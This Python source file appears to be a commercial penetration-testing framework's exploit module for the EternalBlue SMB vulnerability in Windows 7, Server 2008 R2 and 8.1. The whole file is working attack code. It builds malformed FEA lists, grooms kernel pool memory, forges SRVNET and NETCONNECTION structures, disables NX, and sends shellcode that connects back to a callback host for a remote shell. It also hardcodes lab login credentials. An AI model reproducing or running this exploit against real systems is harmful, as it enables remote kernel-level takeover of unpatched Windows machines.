#!/usr/bin/env python

import sys
import os
import socket
import struct
import random
import time
import logging
import traceback

import yaml
from struct import pack

if '.' not in sys.path:
    sys.path.append('.')

from canvasexploit import canvasexploit
import shellcodeGenerator
import canvasengine
from exploitutils import standard_callback_commandline

module_path = os.path.dirname(os.path.realpath(__file__))

from libs import cstruct
import custom_libs.newsmb.libsmb as libsmb
from custom_libs.newsmb.oem_string import *
from custom_libs.newsmb.smb_string import *
from custom_libs.newsmb.libdcerpc import DCERPC, DCERPCException

with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())

NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']
DOCUMENTATION = metadata['DOCUMENTATION']
PROPERTY      = metadata['PROPERTY']
PAYLOADS      = metadata['PAYLOADS']

#XXX Using authentication
xxx_username = "ladmin"
xxx_password = "immlab99"
xxx_domain = "WIN-5K7RROLQ0GO"

FEA_CHUNK_SIZE = 0x11000

class SMBExploitClient(libsmb.SMBClient):
    def __init__(self, *args, **kwargs):
        super(SMBExploitClient, self).__init__(*args, **kwargs)

    def _trans2_large_start(self, setup, param, data, data_frag_len):
        assert 0 <= data_frag_len <= len(data)

        req = self.new_request(libsmb.SMB_COM_NT_TRANSACT, inc_mid=False)

        # Initialize the request parameters.
        req.parameters['MaxSetupCount']       = len(setup)
        req.parameters['TotalParameterCount'] = len(param)
        req.parameters['TotalDataCount']      = len(data)
        req.parameters['MaxParameterCount']   = len(param)
        req.parameters['MaxDataCount']        = len(data)
        req.parameters['ParameterCount']      = len(param)
        req.parameters['DataCount']           = data_frag_len
        req.parameters['SetupCount']          = len(setup) / 2
        req.parameters['Function']            = 2
        req.parameters['Setup']               = USHORT_Array(setup)
        # Initialize the request data.
        req.data['NT_Trans_Parameters']       = UCHAR_Array(param)
        req.data['NT_Trans_Data']             = UCHAR_Array(data[:data_frag_len])
        # Finally, set the offsets of the data members.
        req.parameters['ParameterOffset']     = req.offsetof_data('NT_Trans_Parameters')
        req.parameters['DataOffset']          = req.offsetof_data('NT_Trans_Data')

        res = self.send_recv_command(req)

    def _trans2_large_next(self, data='', data_disp=0, data_frag_len=0):
        send_data_len = min(len(data[data_disp:]), data_frag_len)
        send_data     = data[data_disp:data_disp+send_data_len]

        req = self.new_request(libsmb.SMB_COM_TRANSACTION2_SECONDARY, inc_mid=False)
        req.parameters['TotalParameterCount']   = 0
        req.parameters['TotalDataCount']        = send_data_len
        req.parameters['ParameterCount']        = 0
        req.parameters['ParameterDisplacement'] = 0
        req.parameters['DataCount']             = send_data_len
        req.parameters['DataDisplacement']      = data_disp
        req.parameters['FID']                   = 0
        # Initialize the request data.
        req.data['Trans_Parameters']            = UCHAR_Array(0)
        req.data['Trans_Data']                  = UCHAR_Array(send_data)
        # Finally, set the offsets of the data members.
        req.parameters['ParameterOffset']       = req.offsetof_data('Trans_Parameters')
        req.parameters['DataOffset']            = req.offsetof_data('Trans_Data')

        self.send_request(req)

    def trans2_large_frag_but_one(self, setup, param, data, data_frag_len):
        # Calculate the number of fragments we have for this data.
        fragments  = len(data) // data_frag_len
        fragments += (len(data) % data_frag_len) > 0
        assert fragments > 1

        # Send the starting fragment.  This is a special case.
        self._trans2_large_start(setup, param, data, data_frag_len)

        # Send the rest of the fragments, except the last one.
        for i in xrange(1, fragments - 1):
            self._trans2_large_next(data, i * data_frag_len, data_frag_len)

    def trans2_large_frag_last(self, setup, param, data, data_frag_len):
        last_fragment_len = len(data) % data_frag_len

        if last_fragment_len == 0:
            last_fragment_len = data_frag_len

        self._trans2_large_next(data, len(data) - last_fragment_len, data_frag_len)
        return self.recv_response()

    def trans2_large_frag(self, setup, param, data, data_frag_len):
        for i in xrange(0, len(data), data_frag_len):
            if i == 0:
                self._trans2_large_start(setup, param, data, data_frag_len)
            else:
                self._trans2_large_next(data, i, data_frag_len)

        if data_frag_len < len(data):
            res = self.recv_response()

    def session_setup(self):
        """
        Perform an SMB session setup exchange with server.
        SMBSessionSetupException is raised on failure.
        """

        req = self.new_request(libsmb.SMB_COM_SESSION_SETUP_ANDX)

        req.header['Flags']  = libsmb.SMB_FLAGS_CASE_INSENSITIVE
        req.header['Flags2'] = libsmb.SMB_FLAGS2_NT_STATUS
        if self.is_unicode:
            req.header['Flags2'] |= libsmb.SMB_FLAGS2_UNICODE

        #Set VcNumber to a non-zero value so that we can have concurrent connections
        req.parameters['VcNumber'] = 1

        res = self.send_recv_command(req)

        self.uid          = res.header['UID']
        self.nativeos     = res.data['NativeOS']
        self.nativelanman = res.data['NativeLANMan']


    def malloc_nonpaged_pool(self, size):
        req = libsmb.SMBSessionSetupAndXExtendedRequest()
        req.header['Command']            = libsmb.SMB_COM_SESSION_SETUP_ANDX
        req.header['Flags2']            &= ~libsmb.CAP_EXTENDED_SECURITY
        req.parameters['MaxBufferSize']  = 0x4242

        # MaxMpxCount (2 bytes): The maximum number of pending requests
        # supported by the client. This value MUST be less than or equal to the
        # MaxMpxCount field value provided by the server in the
        # SMB_COM_NEGOTIATE Response.
        #
        # https://msdn.microsoft.com/en-us/library/ee441849.aspx
        #
        # A value less than two means Server.Connection.OpLockSupport will
        # be set to FALSE.  This is fine.
        #
        # https://msdn.microsoft.com/en-us/library/ee441890.aspx
        req.parameters['MaxMpxCount']    = 0

        # A VcNumber of 0 is special, as it closes all other established
        # virtual circuits, so we will not use it.
        #
        # https://msdn.microsoft.com/en-us/library/ee441890.aspx
        req.parameters['VcNumber']       = 1

        # We announce we are capable of extended security, while not having it
        # set in Flags2.
        req.parameters['Capabilities']   = libsmb.CAP_EXTENDED_SECURITY

        # This is a mixed request formed using extended parameters (WordCount
        # 12) that is interpreted as non-extended (WordCount 13).
        # In order to make the whole request valid, we need to add an
        # additional word, and a minimal valid non-extended request data part.
        # This minimal size is 9, for 4 unicode strings, and a padding byte.
        req.data = libsmb.SMB_Data("\0" * 11)

        # XXX: Later check the return status value.
        self.send_recv_command(req)

    def createSessionAllocNonPaged(self, size):
        req = libsmb.SMBSessionSetupAndXExtendedRequest()
        req.header['Command'] = libsmb.SMB_COM_SESSION_SETUP_ANDX
        req.header['Flags2'] &= ~libsmb.CAP_EXTENDED_SECURITY

        if size >= 0xffff:
            req.header['Flags2'] &= ~libsmb.SMB_FLAGS2_UNICODE
            reqSize = size // 2
        else:
            req.header['Flags2'] |= libsmb.SMB_FLAGS2_UNICODE
            reqSize = size

        #XXX this should look different if we are using authentication
        req.parameters['MaxBufferSize']      = 0x4242
        req.parameters['MaxMpxCount']        = 0
        req.parameters['VcNumber']           = 1
        req.parameters['SessionKey']         = 0
        req.parameters['SecurityBlobLength'] = 0
        req.parameters['Capabilities']       = libsmb.CAP_EXTENDED_SECURITY
        req.data = libsmb.SMB_Data(pack('<H', reqSize) + '\x00'*20)

        self.send_recv_command(req)


class SMBExploit(object):
    HAL_HEAP_ADDR   = 0xffffffffffd00000
    HAL_HEAP_ADDR_X86 = 0xffd00000
    SMB2_SPRAY_SIZE = 0x80

    def __init__(self, address, port, callback, isX64, usershellcode=None):
        self.isX64    = isX64
        self._handle  = file(module_path + os.path.sep + 'eternalblue.yaml', 'r')

        self._address  = address
        self._port     = port
        self._callback = callback
        self._usershellcode=usershellcode

    def _load(self, arch):
        self._loader  = cstruct.CStructLoader(self._handle, arch)

    def make_smb2_payload_headers_packet(self, size=None):
        if size is None:
            size = self.SMB2_SPRAY_SIZE

        # don't need a library here, the packet is essentially nonsensical
        pkt  = ""
        pkt += "\x00"              # session message
        pkt += "\x00\xff\xf7"      # size
        pkt += "\xfeSMB"           # SMB2
        pkt += "\x00" * (size - 4)
        return pkt

    def make_fea_list(self):
        netbuf = self._loader.load('NETBUFFER')
        if self.isX64:
            netbuf['PoolHeader.RequestedSize'] = FEA_CHUNK_SIZE
        else:
            netbuf['netbufSize'] = FEA_CHUNK_SIZE
        netbuf['pSrvNetWskStruct']    = self.HAL_HEAP_ADDR
        netbuf['Mdl1.Size']           = 128
        # MDL_NETWORK_HEADER | MDL_SOURCE_IS_NONPAGED_POOL
        netbuf['Mdl1.MdlFlags']       = 0x1004
        netbuf['Mdl1.MappedSystemVa'] = self.HAL_HEAP_ADDR - self.SMB2_SPRAY_SIZE
        netbuf                        = netbuf.serialize()
        if not self.isX64:
            while len(netbuf) < 0xd0:
                netbuf += "\x00"


        # Use the NSA FEA values.  Later we can calculate ok ones.
        fea_data = libsmb.SMB_FEA().serialize() * 605
        fea                                = libsmb.SMB_FEA()
        fea['AttributeValueLengthInBytes'] = 0xf383
        fea['AttributeValue']              = OEM_Array('A' * 0xf383)
        fea_data += fea.serialize()

        # Add the nefarious netbuffer to the FEA list.  We use the terminator
        # of the name to hold the first byte of the netbuf, and the value for
        # the rest.
        oem_netbuf                         = netbuf.decode('latin1')
        fea                                = libsmb.SMB_FEA()
        fea['AttributeValueLengthInBytes'] = len(oem_netbuf) - 1
        fea['AttributeName']               = OEM_String("", terminator=oem_netbuf[0])
        fea['AttributeValue']              = OEM_Array(oem_netbuf[1:])
        fea_data += fea.serialize()


        # Add an invalid FEA to stop the copy operation.
        fea                          = libsmb.SMB_FEA()
        fea['ExtendedAttributeFlag'] = 0x42
        fea_data += fea.serialize()

        # Create the FEA_LIST out of the fea data we serialized.
        fea_list = libsmb.SMB_FEA_LIST()
        fea_list['SizeOfListInBytes'] = 0x10000
        fea_list['FEAList']           = UCHAR_Array(fea_data)

        return fea_list.serialize()


    def make_nx_fea_list(self):
        SHELLCODE_PAGE_ADDR = (self.HAL_HEAP_ADDR + 0x400) & 0xfffffffffffff000
        PTE_ADDR = 0xfffff6ffffffe800 + 8*((SHELLCODE_PAGE_ADDR-0xffffffffffd00000) >> 12)

        netbuf = self._loader.load('NETBUFFER')
        netbuf['PoolHeader.RequestedSize'] = FEA_CHUNK_SIZE
        netbuf['pSrvNetWskStruct']    = self.HAL_HEAP_ADDR
        netbuf['Mdl1.Size']           = 0x60
        # MDL_NETWORK_HEADER | MDL_SOURCE_IS_NONPAGED_POOL
        netbuf['Mdl1.MdlFlags']       = 0x1004
        netbuf['Mdl1.MappedSystemVa'] = PTE_ADDR+7 - self.SMB2_SPRAY_SIZE
        netbuf                        = netbuf.serialize()

        # Use the NSA FEA values.  Later we can calculate ok ones.
        fea_data = libsmb.SMB_FEA().serialize() * 605
        fea                                = libsmb.SMB_FEA()
        fea['AttributeValueLengthInBytes'] = 0xf383
        fea['AttributeValue']              = OEM_Array('A' * 0xf383)
        fea_data += fea.serialize()

        # Add the nefarious netbuffer to the FEA list.  We use the terminator
        # of the name to hold the first byte of the netbuf, and the value for
        # the rest.
        oem_netbuf                         = netbuf.decode('latin1')
        fea                                = libsmb.SMB_FEA()
        fea['AttributeName']               = OEM_String("", terminator=oem_netbuf[0])
        fea['AttributeValueLengthInBytes'] = len(oem_netbuf) - 1
        fea['AttributeValue']              = OEM_Array(oem_netbuf[1:])
        fea_data += fea.serialize()

        # Add an invalid FEA to stop the copy operation.
        fea                          = libsmb.SMB_FEA()
        fea['ExtendedAttributeFlag'] = 0x42
        fea_data += fea.serialize()

        # Create the FEA_LIST out of the fea data we serialized.
        fea_list = libsmb.SMB_FEA_LIST()
        fea_list['SizeOfListInBytes'] = 0x10000
        fea_list['FEAList']           = UCHAR_Array(fea_data)

        return fea_list.serialize()

    def make_recv_struct(self):
        netconn               = self._loader.load("NETCONNECTION")
        netconn['Type']       = 3
        netconn['List.Flink'] = self.HAL_HEAP_ADDR + netconn.offsetof('List')
        netconn['List.Blink'] = self.HAL_HEAP_ADDR + netconn.offsetof('List')
        if self.isX64:
             netconn['ppFuncs']    = self.HAL_HEAP_ADDR + netconn.offsetof('ppFuncs') + 8
             func_ptr_address      = self.HAL_HEAP_ADDR + netconn.offsetof('ppFuncs') + 24 - 1
        else:
            netconn['ppFuncs']    = self.HAL_HEAP_ADDR + netconn.offsetof('ppFuncs') + 0x10 - 4
            func_ptr_address      = self.HAL_HEAP_ADDR + netconn.offsetof('ppFuncs') + 0x54 - 1
            netconn['debug']      = 0x90
        netconn['recvCount']  = func_ptr_address & 0xFFFFFFFF
        netconn['unknown']    = func_ptr_address >> 32

        return netconn.serialize()

    def nonpaged_pool_groom(self, num=13, payload=None):
        if payload is None:
            payload = self.make_smb2_payload_headers_packet()

        groom_fds = []
        for fd in xrange(num):
            fd = socket.socket()
            fd.connect((self._address, self._port))
            fd.send(payload)
            groom_fds.append(fd)

        return groom_fds

    def shellcode_create(self, ip, port):
        replacements = { 'address': socket.inet_aton(ip),
                         'port'   : struct.pack(">H", port) }

        return self.shellcode_tag_replace(**replacements)

    def shellcode_tag_replace(self, **kwargs):
        payload  = ""
        if self.isX64:
            template = PAYLOADS['mosdef-universal']['x86-64']['payload']
            tags     = PAYLOADS['mosdef-universal']['x86-64']['tags']
        else:
            template = PAYLOADS['mosdef-universal']['x86']['payload']
            tags     = PAYLOADS['mosdef-universal']['x86']['tags']

        # See if all tags are consistent, and store their indices.
        for tag in tags:
            if template.count(tag['data']) != 1:
                msg = "'{}' payload has a non-unique '{}' tag."
                raise ValueError(msg.format('canvas.yaml', tag['name']))

            tag['index'] = template.index(tag['data'])

        # Process the indices we have recorded.
        replacements = dict(**kwargs)
        min_index    = 0
        for tag in sorted(tags, key=lambda tag: tag['index']):
            if tag['index'] < min_index:
                msg = "'{}' payload has an overlapping '{}' tag."
                raise ValueError(msg.format('canvas.yaml', tag['name']))

            # Prefix before we found this tag.
            payload += template[min_index:tag['index']]

            # Tag to be replaced.
            replacement = replacements[tag['name']]
            if len(replacement) != len(tag['data']):
                msg = "'{}' payload has a tag '{}' with an inconsistent size."
                raise ValueError(msg.format('canvas.yaml', tag['name']))

            # Fill in the replacement.
            payload += replacements[tag['name']]

            # Record the new minimal index.
            min_index = tag['index'] + len(tag['data'])

        # Add possible trailing data.
        payload += template[min_index:]

        return payload

    def exploit(self):
        # XXX Need to be able to try login if we have username/password or hash
        client = SMBExploitClient.from_address(self._address, self._port, username=xxx_username, password=xxx_password, domain=xxx_domain)
        client.extended_security = False
        client.negotiate()
        client.session_setup()
        client.tree_connect(u'IPC$')

        # At this point we should have the target OS version
        self.isWin7 = False
        self.isWin81 = False
        osstr = unicode(client.nativeos)
        logging.info( "OS %s" % osstr )

        if (u'Windows 7' in osstr) or (u'Windows Server 2008 R2' in osstr):
            self.isWin7 = True
        # if (u'Windows 8.1' in osstr) or (u'Windows Server 2012 R2' in osstr):
        #     self.isWin81 = True

        # if (not self.isWin7) and (not self.isWin81):
        if not self.isWin7:
            logging.error("OS '%s' is not supported" % osstr)
            return

        if self.isWin81:
            self.doExploit81(client)
            return

        if self.isX64:
            self._load("x86-64")
        else:
            self.HAL_HEAP_ADDR = self.HAL_HEAP_ADDR_X86
            self._load("x86")

        # Start the FEA transaction and send everything except the last
        # secondary packet.
        setup = pack('<H', libsmb.TRANS2_OPEN2)
        param = '\0' * 30
        data  = self.make_fea_list()
        try:
            client.trans2_large_frag_but_one(setup, param, data, 1000)
        except:
            logging.warning("Unable to fill memory")
            logging.warning("Client is patched!")
            return
        
        # Hold pages for the FEA request, the SRV structure, and the FEA list.
        # NT_FEA data will be larger, and not fit.
        #XXX fix the login issue here too
        smb = SMBExploitClient.from_address(self._address, self._port, username=xxx_username, password=xxx_password, domain=xxx_domain)
        smb.extended_security = False
        smb.negotiate()
        smb.malloc_nonpaged_pool(FEA_CHUNK_SIZE-0x1000)

        # Groom the nonpaged pool filling it with SRVNET buffer data.
        groom_fds = self.nonpaged_pool_groom()

        # Hold the hole we will use for the converted NT_FEA data.
        #XXX login issue here too
        smb_hole = SMBExploitClient.from_address(self._address, self._port, username=xxx_username, password=xxx_password, domain=xxx_domain)
        smb_hole.extended_security = False
        smb_hole.negotiate()
        smb_hole.malloc_nonpaged_pool(FEA_CHUNK_SIZE)

        # Create a hole for handling the FEA command.
        smb.s.close()

        # Spray srvnet_buffer structures which we will overwrite.
        spray_fds = self.nonpaged_pool_groom(5)

        # Create a hole for the converted NT_FEA data.
        smb_hole.s.close()

        # Finish the transaction.
        try:
            logging.info("Sending trigger packet")
            res = client.trans2_large_frag_last(setup, param, data, 1000)
            logging.info( "Status: %x" % res.status)
            if res.status == 0xc000000d:
                logging.info('Good response status for trigger: INVALID_PARAMETER')
                logging.info('Waiting for callback...')
                logging.info('If it hangs here, we failed to overwrite a NETCONNECTION buffer.')
                logging.info('You can probably try again.')
            else:
                logging.error("We got an unexpected response '0x%x' . Bailing" % res.status)
                logging.error('You can probably try again.')
                return
        except:
            logging.info( "The target appears to be patched" )
            return

        if self.isX64:
            shellcode = self.shellcode_create(self._callback.ip, self._callback.port)
            for sd in spray_fds:
                sd.sendall(self.make_recv_struct() + shellcode)
        else:
            logging.info("Callback received")
            shellcode = PAYLOADS['mosdef-universal']['x86']['payload']
            callcode= '\xe8'+struct.pack("<I", len(self._usershellcode))  #call +
            callcode +=self._usershellcode
            callcode += '\x59'              # pop     ecx
            callcode += '\x60'              # pushad
            callcode += '\x68'+struct.pack("<I", len(self._usershellcode)) # push
            callcode += '\x51'              # push    ecx
            # call kernel_shellcode(self._usershellcode, len(self._usershellcode))
            callcode += '\xe8'+struct.pack("<I", 6)
            callcode += '\x59'              # pop     ecx
            callcode += '\x59'              # pop     ecx
            callcode += '\x61'              # popad
            callcode += "\xc2\x24\x00"      # retn 24
            buffer = self.make_recv_struct() + callcode+ shellcode
            for sd in spray_fds:
                sd.sendall(buffer)

        for sd in spray_fds:
            sd.close()

        if self.isX64:
            time.sleep(1)
        else:
            time.sleep(5)

        return True

    def doExploit81(self, client):
        self.shellcode = self.shellcode_create(self._callback.ip, self._callback.port)
        logging.debug( "Total shellcode length is 0x%x bytes"%len(self.shellcode))
        if len(self.shellcode) > 0xe80:
            logging.info( "The shellcode should be less than 0xe80")
        self.init_bufs_81()

        # The minimum requirement to trigger bug in SrvOs2FeaListSizeToNt() is SrvSmbOpen2() which is TRANS2_OPEN2 subcommand.
        # Send TRANS2_OPEN2 (0) with special feaList to a target except last fragment
        data = self.win81_fea_list
        setup = pack('<H', libsmb.TRANS2_OPEN2)
        param = '\0' * 30
        client.trans2_large_frag_but_one(setup, param, data, 1000)

        # Another TRANS2_OPEN2 (0) with special feaList for disabling NX
        nxtrans = SMBExploitClient.from_address(self._address, self._port, username=xxx_username, password=xxx_password, domain=xxx_domain)
        nxtrans.extended_security = False
        nxtrans.negotiate()
        nxtrans.session_setup()
        nxtrans.tree_connect(u'IPC$')
        nxdata = self.nx_fea_list
        nxtrans.trans2_large_frag_but_one(setup, param, nxdata, 1000)

        # create some big buffer at server
        # this buffer MUST NOT be big enough for overflown buffer
        #XXX login
        allocConn = SMBExploitClient.from_address(self._address, self._port, username=xxx_username, password=xxx_password, domain=xxx_domain)
        allocConn.extended_security = False
        allocConn.negotiate()
        allocConn.createSessionAllocNonPaged(self.NTFEA_SIZE - 0x2010)

        # groom nonpaged pool
        # when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one
        groomfds = []
        for i in range(self.numGroomConn):
            sk = self.createConnectionWithBigSMBFirst80(self._address, True)
            groomfds.append(sk)

        # create buffer size NTFEA_SIZE at server
        # this buffer will be replaced by overflown buffer
        #XXX login
        holeConn = SMBExploitClient.from_address(self._address, self._port, username=xxx_username, password=xxx_password, domain=xxx_domain)
        holeConn.extended_security = False
        holeConn.negotiate()
        holeConn.createSessionAllocNonPaged(self.NTFEA_SIZE - 0x10)

        # disconnect allocConn to free buffer
        # expect small nonpaged pool allocation is not allocated next to holeConn because of this free buffer
        allocConn.s.close()

        # hope one of srvnetConn is next to holeConn
        for i in range(5):
            sk = self.createConnectionWithBigSMBFirst80(self._address, True)
            groomfds.append(sk)

        # remove holeConn to create hole for fea buffer
        holeConn.s.close()

        # send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
        # first trigger, overwrite srvnet buffer struct for disabling NX
        res = nxtrans.trans2_large_frag_last(setup, param, nxdata, 1000)
        if res.status == 0xc000000d:
            logging.debug('Good response status for nx: INVALID_PARAMETER')

        # one of srvnetConn struct header should be modified
        # send '\x00' to disable nx
        for sk in groomfds:
            sk.send('\x00')

        # send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
        # second trigger, place fake struct and shellcode
        logging.info( "Sending trigger packet...")
        res = client.trans2_large_frag_last(setup, param, data, 1000)
        logging.info( "Status: %x" % res.status)
        if res.status == 0xc000000d:
            logging.info('Good response status for trigger: INVALID_PARAMETER')
            logging.info('Waiting for callback')
            logging.info('If it hangs here, we failed to overwrite a NETCONNECTION buffer')
            logging.info('You can probably try again')

        # one NETCONNECTION should be modified
        # a corrupted buffer will write recv data in the designated memory address
        for sk in groomfds:
            sk.send(self.fake_recv_struct + self.shellcode)

        # execute shellcode
        for sk in groomfds:
            sk.close()

        #close unneeded connections
        nxtrans.s.close()
        client.s.close()


    def init_bufs_81(self):
        from struct import pack
        USERNAME=''
        PASSWORD=''
        self.numGroomConn = 13
        self.NTFEA_SIZE = 0x9000
        self.TARGET_HAL_HEAP_ADDR = 0xffffffffffd04000
        SHELLCODE_PAGE_ADDR = (self.TARGET_HAL_HEAP_ADDR + 0x400) & 0xfffffffffffff000
        PTE_ADDR = 0xfffff6ffffffe800 + 8*((SHELLCODE_PAGE_ADDR-0xffffffffffd00000) >> 12)

        ntfea9000 = (pack('<BBH', 0, 0, 0) + '\x00')*0x260       # ntfea size is 0x1c80
        ntfea9000 += pack('<BBH', 0, 0, 0x735c) + '\x00'*0x735d  # 0x8fe8 - 0x1c80 - 0xc = 0x735c
        ntfea9000 += pack('<BBH', 0, 0, 0x8147) + '\x00'*0x8148  # overflow to SRVNET_BUFFER_HDR

        fakeSrvNetBufferX64Nx = '\x00'*16
        fakeSrvNetBufferX64Nx += pack('<HHIQ', 0xfff0, 0, 0, self.TARGET_HAL_HEAP_ADDR)
        fakeSrvNetBufferX64Nx += '\x00'*16
        fakeSrvNetBufferX64Nx += '\x00'*16
        fakeSrvNetBufferX64Nx += pack('<QQ', 0, 0)
        fakeSrvNetBufferX64Nx += pack('<QQ', 0, self.TARGET_HAL_HEAP_ADDR)
        fakeSrvNetBufferX64Nx += pack('<QQ', 0, 0)
        fakeSrvNetBufferX64Nx += '\x00'*16
        fakeSrvNetBufferX64Nx += '\x00'*16
        fakeSrvNetBufferX64Nx += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
        fakeSrvNetBufferX64Nx += pack('<QQ', 0, PTE_ADDR+7-0x7f)    # MDL.Process, MDL.MappedSystemVa

        feaListNx = pack('<I', 0x10000)
        feaListNx += ntfea9000
        feaListNx += pack('<BBH', 0, 0, len(fakeSrvNetBufferX64Nx)-1) + fakeSrvNetBufferX64Nx # -1 because first '\x00' is for name
        # stop copying by invalid flag (can be any value except 0 and 0x80)
        feaListNx += pack('<BBH', 0x12, 0x34, 0x5678)

        fake_recv_struct = ('\x00'*16)*5
        fake_recv_struct += pack('<QQ', 0, self.TARGET_HAL_HEAP_ADDR+0x58)  # offset 0x50: KSPIN_LOCK, (LIST_ENTRY to itself)
        fake_recv_struct += pack('<QQ', self.TARGET_HAL_HEAP_ADDR+0x58, 0)  # offset 0x60
        fake_recv_struct += ('\x00'*16)*10
        fake_recv_struct += pack('<QQ', self.TARGET_HAL_HEAP_ADDR+0x170, 0)  # offset 0x110: fn_ptr array
        fake_recv_struct += pack('<QQ', (0x8150^0xffffffffffffffff)+1, 0)    # set arg1 to -0x8150
        fake_recv_struct += pack('<QII', 0, 0, 3)  # offset 0x130
        fake_recv_struct += ('\x00'*16)*3
        fake_recv_struct += pack('<QQ', 0, self.TARGET_HAL_HEAP_ADDR+0x180)  # shellcode address

        self.win81_fea_list = self.createFeaList(len(self.shellcode), ntfea9000)
        self.nx_fea_list = feaListNx
        self.fake_recv_struct = fake_recv_struct


    def createFakeSrvNetBuffer(self, sc_size):
        # 0x180 is size of fakeSrvNetBufferX64
        totalRecvSize = 0x80 + 0x180 + sc_size
        fakeSrvNetBufferX64 = '\x00'*16
        fakeSrvNetBufferX64 += pack('<HHIQ', 0xfff0, 0, 0, self.TARGET_HAL_HEAP_ADDR)  # flag, _, _, pNetRawBuffer
        fakeSrvNetBufferX64 += pack('<QII', 0, 0x82e8, 0)  # _, thisNonPagedPoolSize, _
        fakeSrvNetBufferX64 += '\x00'*16
        fakeSrvNetBufferX64 += pack('<QQ', 0, totalRecvSize)  # offset 0x40
        fakeSrvNetBufferX64 += pack('<QQ', self.TARGET_HAL_HEAP_ADDR, self.TARGET_HAL_HEAP_ADDR)  # pmdl2, pointer to fake struct
        fakeSrvNetBufferX64 += pack('<QQ', 0, 0)
        fakeSrvNetBufferX64 += '\x00'*16
        fakeSrvNetBufferX64 += '\x00'*16
        fakeSrvNetBufferX64 += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
        fakeSrvNetBufferX64 += pack('<QQ', 0, self.TARGET_HAL_HEAP_ADDR-0x80)  # MDL.Process, MDL.MappedSystemVa
        return fakeSrvNetBufferX64

    def createFeaList(self, sc_size, ntfea9000):
        feaList = pack('<I', 0x10000)
        feaList += ntfea9000
        fakeSrvNetBuf = self.createFakeSrvNetBuffer(sc_size)
        feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuf)-1) + fakeSrvNetBuf # -1 because first '\x00' is for name
        # stop copying by invalid flag (can be any value except 0 and 0x80)
        feaList += pack('<BBH', 0x12, 0x34, 0x5678)
        return feaList


    # connect to target and send a large nbss size with data 0x80 bytes
    # this method is for allocating big nonpaged pool on target
    def createConnectionWithBigSMBFirst80(self, target, for_nx=False):
        sk = socket.create_connection((target, 445))
        pkt = '\x00' + '\x00' + pack('>H', 0x8100)
        pkt += 'CNVS' # can be anything
        if for_nx:
            # MUST set no delay because 1 byte MUST be sent immediately
            sk.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            pkt += '\x00'*0x7b  # another byte will be sent later to disable NX
        else:
            pkt += '\x00'*0x7c
        sk.send(pkt)
        return sk

class theexploit(canvasexploit, object):
    def __init__(self):
        super(theexploit, self).__init__()

        self.name       = NAME
        self.version    = VERSION
        self.setInfo(DESCRIPTION)

        self.port       = 445
        self.is_64bit   = True

    def getArgs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]


    def createShellcode(self):
        sc = shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp', {'subespval': 0})
        sc.addAttr('revert_to_self_before_importing_ws2_32', None)
        sc.addAttr('tcpconnect', {'port'      : self.callback.port,
                                      'ipaddress' : self.callback.ip})
        mosdef_type = self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
        mosdef_id = self.engine.getNewMosdefID(self)
        sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
        sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
        sc.vAllocSelf = True
        self.shellcode = sc.get()

        logging.info("Shellcode size: %d" % len(self.shellcode))
        return self.shellcode

    def detect_arch(self):
        binding = "ncacn_ip_tcp:%s[135]" % self.host
        # binding = "ncacn_np:%s[445]" % self.host
        dce = DCERPC(binding, getsock=None)
        try:
            r = dce.bind('e1af8308-5d1f-11c9-91a4-08002b14a0fa', '3.0',
                         t_uuid='71710533-beba-4937-8319-b5dbef9ccc36', t_ver=u'1.0')
        except DCERPCException, e:
            logging.error("Error while detecting target architecture, assuming 64bit")
            return

        if not r:
            logging.warning("Detected 32bit arch")
            self.is_64bit = False
        else:
            logging.warning("Detected 64bit arch")

    def run(self):
        self.getArgs()
        self.detect_arch()

        if self.is_64bit:
            e = SMBExploit(self.host, self.port, self.callback, self.is_64bit)
        else:
            usershellcode=self.createShellcode()
            e = SMBExploit(self.host, self.port, self.callback, self.is_64bit, usershellcode)

        return e.exploit()

    def test(self):
        self.getArgs()
        logging.info('{} testing host {}:{}'.format(self.name, self.host, self.port))

        with SMBExploitClient.from_address(self.host, self.port, self.callback) as smb:
            smb.extended_security = False
            smb.negotiate()
            smb.session_setup()
            smb.tree_connect(u'IPC$')

            # Create a custom SMB_COM_TRANSACTION request.
            setup = struct.pack("<HH", libsmb.TRANS_PEEK_NMPIPE, smb.fid)
            req   = smb.new_request(libsmb.SMB_COM_TRANSACTION)
            req.parameters['Setup']             = USHORT_Array(setup)
            req.parameters['SetupCount']        = len(setup) / 2
            req.parameters['MaxParameterCount'] = 0xD000
            req.parameters['MaxDataCount']      = 0xD000
            req.parameters['ParameterOffset']   = req.offsetof_data('Trans_Parameters')

            res = smb.send_recv_command(req)
            return res.status == libsmb.STATUS_INSUFF_SERVER_RESOURCES

if __name__=='__main__':
    logging.info('Running CANVAS %s Exploit v%s' % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()
